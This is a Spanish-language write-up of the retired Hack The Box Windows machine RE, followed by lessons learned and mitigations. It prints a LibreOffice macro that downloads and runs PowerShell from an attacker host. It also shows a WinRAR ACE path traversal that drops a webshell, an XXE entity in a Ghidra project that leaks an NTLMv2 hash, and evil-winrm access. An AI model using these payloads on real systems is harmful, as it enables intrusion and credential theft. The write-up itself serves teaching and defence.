---
machine: RE
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, smb, libreoffice, macro, winrar, path-traversal, ghidra, xxe, ntlm, privesc]
---

# RE — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El share `malware_dropbox` acepta escritura como invitado y un analista abre los documentos que se depositan. Se sube un `.ods` con una macro de LibreOffice Basic que descarga y ejecuta PowerShell, lo que da shell como `luke`. En su equipo, el pipeline procesa ACE con una DLL vulnerable (CVE-2018-20250) y permite un traversal (`..\`) para escribir un webshell en el directorio de IIS, y se obtiene shell como el AppPool. El directorio `C:\proj_drop` es escribible y una tarea abre proyectos de Ghidra; un `project.prp` con XXE hace que Ghidra solicite un recurso al atacante y filtra el hash NTLMv2 de `coby`. Crackeado el hash, WinRM da acceso como administrador.

## Reconocimiento

```bash
nmap -Pn -sCV -p80,445 <IP>
```

- `80`: IIS con una web de "coming soon".
- `445`: SMB con el share `malware_dropbox`.

```bash
smbclient -N -L //<IP>
smbclient -N //<IP>/malware_dropbox
```

## Enumeración

El share `malware_dropbox` es accesible como invitado y la web de IIS está en construcción. `smbclient` lista el recurso y confirma que se puede escribir.

## Foothold

El share es escribible de forma anónima. Se crea un documento de LibreOffice con una macro Basic:

```basic
Sub Main
  Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://<LHOST>/shell.ps1')""")
End Sub
```

Se sube el `.ods` y, cuando un usuario lo abre, la macro ejecuta el download cradle de Nishang y devuelve una shell como `luke`.

```bash
smbclient -N //<IP>/malware_dropbox -c 'put shell.ods'
```

## Movimiento lateral

En `C:\Users\luke\Documents` hay muestras y scripts (`malware_process`, `ods`, `ods.yara`, `process_samples.ps1`). El pipeline de análisis espera archivos RAR y procesa ACE con una DLL vulnerable a la CVE-2018-20250; 0xdf lo explota con PeaZip. Una ACE con rutas `..\` escribe fuera del directorio de extracción.

Se empaqueta un webshell ASPX con traversal hacia `C:\inetpub\wwwroot\re\` y se abre con esa herramienta; el archivo queda en el webroot y se ejecuta como el usuario del AppPool de IIS.

## Escalada de privilegios

`icacls C:\proj_drop` muestra que el AppPool puede escribir y que `coby` (Administrator) abre los proyectos. La página indica que se aceptan proyectos de Ghidra. Se crea un proyecto con un `project.prp` que incluye una entidad XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "//<LHOST>/xxe">
  %xxe;
]>
```

Se comprime con la estructura esperada y se sube a `C:\proj_drop`. Cuando Ghidra abre el proyecto, solicita el recurso y `Responder` captura el hash NTLMv2 de `coby`. Tras crackearlo, las credenciales permiten WinRM:

```bash
evil-winrm -i <IP> -u coby -p '<PASSWORD>'
```

Como `coby` está en Administrators, se lee `root.txt`.

## Evidencia

- Share anónimo escribible y macro `.ods` ejecutada por `luke`.
- WinRAR vulnerable y webshell escrito en el webroot mediante traversal.
- `proj_drop` escribible y proyecto Ghidra con XXE.
- Hash NTLMv2 de `coby` capturado y crackeado.
- WinRM como administrador.

## Lecciones aprendidas

- Un dropbox de malware debe analizarse en un entorno aislado y sin macros.
- Las macros de LibreOffice ejecutan comandos igual que VBA.
- WinRAR sin parchear permite escribir fuera del destino con ACE.
- Un directorio de intercambio procesado por una aplicación privilegiada es superficie de ataque.
- Ghidra también procesa XML y puede caer en XXE.
- Los hashes NTLMv2 se capturan con recursos UNC salientes.

## Mitigaciones y detección

- Deshabilitar macros y abrir documentos en una sandbox.
- Actualizar WinRAR y bloquear archivos ACE.
- No permitir escritura anónima en shares.
- Aislar y validar los proyectos que abre una herramienta privilegiada.
- Bloquear SMB saliente y firmar SMB para evitar filtraciones NTLM.
- Monitorizar procesos de Office/LibreOffice, WinRAR y solicitudes UNC.

## Referencias

- [0xdf — RE](https://0xdf.gitlab.io/2020/02/01/htb-re.html)
- [Hack The Box — RE](https://app.hackthebox.com/machines/re)
- [NVD — CVE-2018-20250](https://nvd.nist.gov/vuln/detail/CVE-2018-20250)
